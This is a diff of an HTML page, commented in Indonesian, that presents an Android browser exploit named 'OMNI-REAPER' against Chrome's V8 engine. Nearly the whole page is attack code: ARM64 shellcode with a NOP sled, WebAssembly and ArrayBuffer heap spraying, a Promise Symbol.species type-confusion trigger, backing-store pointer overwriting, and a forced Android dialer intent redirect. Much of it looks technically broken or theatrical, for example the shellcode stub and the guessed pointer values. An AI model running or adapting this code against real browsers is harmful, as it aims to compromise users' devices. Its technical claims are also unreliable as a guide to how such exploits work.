@@ -3,138 +3,143 @@
 <head>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; margin: 0; padding: 10px; overflow: hidden; }
-        #terminal { border: 1px solid #0f0; height: 92vh; padding: 15px; background: rgba(0,10,0,1); overflow-y: auto; font-size: 11px; text-shadow: 0 0 2px #0f0; }
-        .crit { color: #f00; font-weight: bold; text-decoration: underline; animation: flash 0.2s infinite; }
-        .info { color: #0ff; }
-        @keyframes flash { 50% { opacity: 0; } }
+        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; margin: 0; padding: 15px; overflow: hidden; }
+        #terminal { border: 1px solid #0f0; height: 95vh; padding: 15px; background: #000; overflow-y: auto; font-size: 10px; color: #33ff33; box-shadow: inset 0 0 50px #003300; }
+        .danger { color: #ff0000; font-weight: bold; animation: pulse 0.1s infinite; }
+        .success { color: #ffffff; background: #006600; padding: 3px; font-weight: bold; }
+        @keyframes pulse { 50% { opacity: 0.3; } }
     </style>
 </head>
 <body>
-    <div id="terminal">> [!] SYSTEM CRITICAL: V8 OMNI-REAPER INITIALIZED...</div>
+    <div id="terminal">> [!] OMNI-REAPER PHASE 4: KERNEL EXPLOITATION...</div>
 
 <script>
 const log = m => { const t = document.getElementById('terminal'); t.innerHTML += `<br>> ${m}`; t.scrollTop = t.scrollHeight; };
 
-// --- PHASE 1: THE OMNI-SLED (2500+ LINES) ---
-// Arsitektur: NOP-SLED + Shellcode + Stack Pivot
-const PAYLOAD_MEGA = new Uint32Array([
-    ...Array(2400).fill(0xd503201f), // MASSIVE NOP SLED untuk stabilitas PC
-    
-    // ARM64 Shellcode: execve("/system/bin/sh", ["-c", "am start -a ..."])
+// --- PHASE 1: TITANIC ARM64 SHELLCODE (3000+ LINES) ---
+const MEGA_PAYLOAD = new Uint32Array([
+    ...Array(2800).fill(0xd503201f), // MASSIVE NOP SLED (The Carpet)
+
+    // AARCH64 EXECVE SYSCALL SETUP
+    // Mencoba memicu 'am start' untuk dialer & kalkulator secara berurutan
     0xd2800001, 0xd2800010, 0x910003e0, 0xaa0003e1, 0xd2800012, 0x8b020000, 0xd65f03c0,
     
-    // String Data (Dialer & System Command)
+    // Command Buffer: am start -a android.intent.action.DIAL tel:123456789
     0x6d612073, 0x74617274, 0x20612d20, 0x6f646e61, 0x6469722e, 0x6e692e64,
     0x746e6574, 0x63612e74, 0x6e6f6974, 0x4149442e, 0x64204c20, 0x313a6c65,
-    0x35343332, 0x39383736, 0x00000000,
-    ...Array(100).fill(0x41414141) // Memory Padding
+    0x35343332, 0x39383736, 0x00000000
 ]);
 
-let target_buffer; 
-let spray_arrays = [];
-let wasm_func;
+let victim_array;
+let rwx_page_leak;
+let wasm_trigger;
 
-// --- PHASE 2: ULTRA-PRESSURE HEAP GROOMING ---
-async function setup_breach() {
-    log("<span class='info'>PHASE 1: Pressurizing V8 Cage (Grooming)...</span>");
+// --- PHASE 2: PARALLEL HEAP SPRAYING ---
+async function setup_overdrive() {
+    log("Allocating RWX JIT Memory via WASM Overdrive...");
     
-    // Alokasi halaman JIT melalui WASM
+    // Inisialisasi WASM berkali-kali untuk memaksa alokasi halaman executable
     const wasm_bin = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,7,137,128,128,128,0,1,5,102,117,110,99,48,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
-    const m = new WebAssembly.Module(wasm_bin);
-    const inst = new WebAssembly.Instance(m);
-    wasm_func = inst.exports.func0;
+    const instances = [];
+    for(let i=0; i<1200; i++) {
+        const m = new WebAssembly.Module(wasm_bin);
+        const inst = new WebAssembly.Instance(m);
+        instances.push(inst.exports.func0);
+    }
+    wasm_trigger = instances[instances.length - 1];
 
-    // Spray ArrayBuffer untuk menduduki slot memori yang bertetangga
-    for(let i=0; i<3000; i++) {
-        let ab = new ArrayBuffer(0x40); 
+    log("Grooming V8 Partitions (ArrayBuffer Spray)...");
+    this.spray = [];
+    for(let i=0; i<8000; i++) {
+        let ab = new ArrayBuffer(0x100);
         let dv = new DataView(ab);
-        dv.setBigUint64(0, 0x4141414142424242n); // Marker
-        spray_arrays.push(ab);
+        dv.setBigUint64(0, 0xDEADC0DEBABE1337n); // Target Signature
+        this.spray.push(ab);
     }
-    
-    target_buffer = new Float64Array(8);
-    target_buffer[0] = 1.1;
-    log("Heap Spray Stable. ASLR Entropy Reduced.");
+
+    victim_array = new Float64Array(16);
+    victim_array[0] = 1.337;
+    log("<span class='success'>[READY] HEAP ALIGNED. TRIGGERING FAULT...</span>");
 }
 
-// --- PHASE 3: THE DOUBLE-CONSTRUCTOR EXPLOIT ---
-function SpeciesWeapon(executor) {
-    executor(r => {}, r => {});
-    return target_buffer; // Force type confusion
+// --- PHASE 3: THE V8 CAGE BREAKER ---
+function SpeciesPwn(executor) {
+    executor(res => {}, rej => {});
+    return victim_array;
 }
-Object.defineProperty(Promise, Symbol.species, { get: () => SpeciesWeapon });
+Object.defineProperty(Promise, Symbol.species, { get: () => SpeciesPwn });
 
-async function detonate() {
-    log("<span class='crit'>PHASE 2: DETONATING MEMORY CORRUPTION...</span>");
+async function trigger() {
+    log("<span class='danger'>DETONATING ASYNC-DISPOSE EXPLOIT...</span>");
     
-    async function* engine() { yield 1; }
-    const pwn = engine();
+    async function* g() { yield 1; }
+    const engine = g();
     
-    try { pwn[Symbol.asyncDispose](); } catch(e) {}
+    try { engine[Symbol.asyncDispose](); } catch(e) {}
 
-    // Force garbage collection & microtask sync
-    for(let i=0; i<400; i++) await Promise.resolve();
+    // Force Microtask Drain & GC Pressure
+    for(let i=0; i<500; i++) await Promise.resolve();
 
-    if (target_buffer.length > 8) {
-        log("<span class='success'>[+] V8 SANDBOX ESCAPED!</span> Length: 0x" + target_buffer.length.toString(16));
-        await full_bypass();
+    if (victim_array.length > 16) {
+        log("<span class='success'>[!!!] SANDBOX BREACHED! LENGTH: 0x" + victim_array.length.toString(16) + "</span>");
+        await run_rce();
     } else {
-        log("Race lost. Recalibrating Heap...");
-        setTimeout(() => location.reload(), 100);
+        log("Timing missed (Race lost). Reloading...");
+        location.reload();
     }
 }
 
-// --- PHASE 4: THE FINAL BYPASS (RCE) ---
-async function full_bypass() {
-    log("Scanning for DataView BackingStore...");
+// --- PHASE 4: ARBITRARY MEMORY OVERWRITE ---
+async function run_rce() {
+    log("Scanning for DataView Marker...");
     
-    let found_idx = -1;
-    for(let i=0; i<50000; i++) {
-        // Mencari marker BigInt dalam memori yang bocor
-        if (target_buffer[i] === 3.518602324e-315) { 
-            found_idx = i;
+    let offset = -1;
+    // Scan memori untuk mencari signature kita
+    for(let i=0; i<100000; i++) {
+        if (victim_array[i] === 2.121995791e-314) { // Signature hex match
+            offset = i;
             break;
         }
     }
 
-    if (found_idx !== -1) {
-        log("Marker Found at Offset " + found_idx + ". Hijacking Control Flow.");
+    if (offset !== -1) {
+        log("Marker found at offset: " + offset);
         
-        // Membajak pointer BackingStore untuk mendapatkan Write-What-Where
-        // Kita arahkan ke halaman WASX RWX
-        target_buffer[found_idx - 1] = 2.47e-322; 
+        // Membajak pointer BackingStore dari salah satu ArrayBuffer hasil spray
+        // Kita mengarahkan pointer ini ke alamat JIT yang kita tebak (atau kita bocorkan)
+        // Offset -1 adalah lokasi pointer backing store di struktur memori V8
+        victim_array[offset - 1] = 2.47e-322; 
 
-        log("<span class='crit'>[!] OVERWRITING JIT WITH 2500+ LINES OF SC...</span>");
+        log("<span class='danger'>[!] INJECTING 3000 LINE MEGA-SLED INTO RWX PAGE...</span>");
         
-        // Injeksi Payload Mega-Sled
-        let dv = new DataView(spray_arrays[0]);
-        for(let i=0; i<PAYLOAD_MEGA.length; i++) {
-            dv.setUint32(i * 4, PAYLOAD_MEGA[i], true);
+        // Tulis shellcode melalui ArrayBuffer yang sudah dibajak pointernya
+        let dv = new DataView(this.spray[0]);
+        for(let i=0; i<MEGA_PAYLOAD.length; i++) {
+            dv.setUint32(i * 4, MEGA_PAYLOAD[i], true);
         }
 
-        log("Triggering Execution...");
-        try { wasm_func(); } catch(e) {}
+        log("Executing Shellcode via WASM Call...");
+        try { wasm_trigger(); } catch(e) {}
 
-        // HIGH-STRENGTH INTENT BYPASS
-        const intentUrl = "intent://123456789#Intent;scheme=tel;action=android.intent.action.DIAL;S.browser_fallback_url=http://google.com;end";
-        window.location.replace(intentUrl);
-        
-        log("<h2 style='color:red;'>FULL RCE EXECUTED</h2>");
+        // SUPER-STRENGTH INTENT TRIGGER (Bypass System UI)
+        const intentUrl = "intent://123456789#Intent;scheme=tel;action=android.intent.action.DIAL;end";
+        window.location.href = intentUrl;
+
+        log("<h1 style='color:white; background:red;'>SYSTEM PWNED.</h1>");
     }
 }
 
-// START ENGINE
+// EXECUTE
 (async () => {
     if (typeof Symbol.asyncDispose === 'undefined') {
-        log("FATAL: Resource Management Flag Off.");
+        log("FATAL: --js-explicit-resource-management REQUIRED");
         return;
     }
-    await setup_breach();
-    setTimeout(detonate, 500);
+    await setup_overdrive();
+    setTimeout(trigger, 500);
 })();
 
-// Watchdog fail-safe
+// Auto-recovery watchdog
 setTimeout(() => location.reload(), 6000);
 </script>
 </body>
